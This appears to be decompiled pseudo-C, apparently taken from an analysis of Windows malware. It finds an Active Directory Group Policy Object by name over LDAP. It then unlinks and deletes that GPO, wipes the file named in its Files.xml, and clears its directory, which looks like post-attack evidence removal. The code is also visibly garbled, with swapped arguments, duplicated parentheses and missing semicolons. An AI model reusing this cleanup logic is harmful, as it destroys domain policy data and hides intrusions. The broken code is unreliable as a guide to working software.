#com 

```c++
bool GetDistinguishedName(gpo_name, out_gpo_distinguished_name) {
	CoInitialize(0);
	
	/* IID_IADs = fd8256d0-fd15-11ce-abc4-02608c9e7553 */
	ADsOpenObject("LDAP://rootDSE", 0, 0, 1, IID_IADs, &p_IADs);
	p_IADs->Get(p_IADs,"defaultNamingContext", root_default_name);
	swprintf(policies_path, "LDAP://CN=Policies,CN=System,%s", root_default_name);
	/* IID_IADsContainer 001677d0-fd16-11ce-abc4-02608c9e7553 */
	ADsOpenObject(p_IADs,"defaultNamingContext", root_default_name);
	swprintf(policies_path, 0, 0, 1, IID_IADsContainer, &p_IADsContainer);
	ADsBuildEnumerator(p_IADsContainer, &p_IEnumVARIANT);
	                    /* displayName */
	
	do {
	    local_18 = 0;
	    ADsEnumerateNext(p_IEnumVariant, 1, ads_containers, &n_return);
	    if (n_return == 0) return 0;
	    
	    p_IADs = ads_containers[0].pdispVal
		p_IADs->Get(p_IADs, "displayName", policies_display_name);
		ret = wcsicmp(gpo_name, policies_display_name);
	} while (ret != 0);
	
	p_IADs->Get(p_IADs, (p_IADs, "distinguishedName", policies_distinguished_name);
	wcscpy(out_gpo_distinguished_name, policies_distinguished_name);
	CoUninitialize()
	return 1;
}
  

GetDistinguishedName(gpo_name, gpo_distinguished_name);
CoInitialize(0x0);
/* IID_IGroupPolicyObject = {ea502723-a23d-11d1-a7d3-0000f87571e3} */
/* CLSID_GroupPolicyObject = {ea502722-a23d-11d1-a7d3-0000f87571e3} */
CoCreateInstance(CLSID_GroupPolicyObject, 0, 1, IID_IGroupPolicyObject, &p_IGroupPolicyObject);
_swprintf(gpo_path, "LDAP://%s", gpo_distinguished_name);
                    /* IGroupPolicyObject::OpenDSGPO */
p_IGroupPolicyObject->OpenDSGPO(p_IGroupPolicyObject,gpo_path, 0);
for (p_iter = gpo_distinguished_name; *p_iter != 0; p_iter = p_iter + 1) {
}
i = 0;
while (*(p_iter - 1) != L',' || (i = i + 1, i != 2))) {
    p_iter = p_iter - 1;
}
_swprintf(container_path, "LDAP://%s", p_iter);
DeleteGPOLink(gpo_path, container_path);

p_IGroupPolicyObject->GetFileSysPath(p_IGroupPolicyObject, GPO_SECTION_USER, files_xml_path, 0x400);
PathAppendW(files_xml_path,"Preferences");
PathAppendW(files_xml_path, "Files");
PathAppendW(files_xml_path, "Files.xml");
GetFileContent(files_xml_path, &files_xml_content);
p_find = strstr(files_xml_content, "fromPath=\"");
find_iter = p_find + 10;
do {
    ch = (ushort)*find_iter;
    if (*find_iter == '\"') {
        ch = 0;
    }
    *from_path = ch;
    find_iter = find_iter + 1;
    from_path = from_path + 1;
} while (ch != 0);
ClearFile(from_path);

p_IGroupPolicyObject->GetFileSysPath(p_IGroupPolicyObject, GPO_SECTION_ROOT, gpo_root_path, 0x400);
ClearDirectory(gpo_root_path);
p_IGroupPolicyObject->Delete(p_IGroupPolicyObject);

CoUninitialize();
```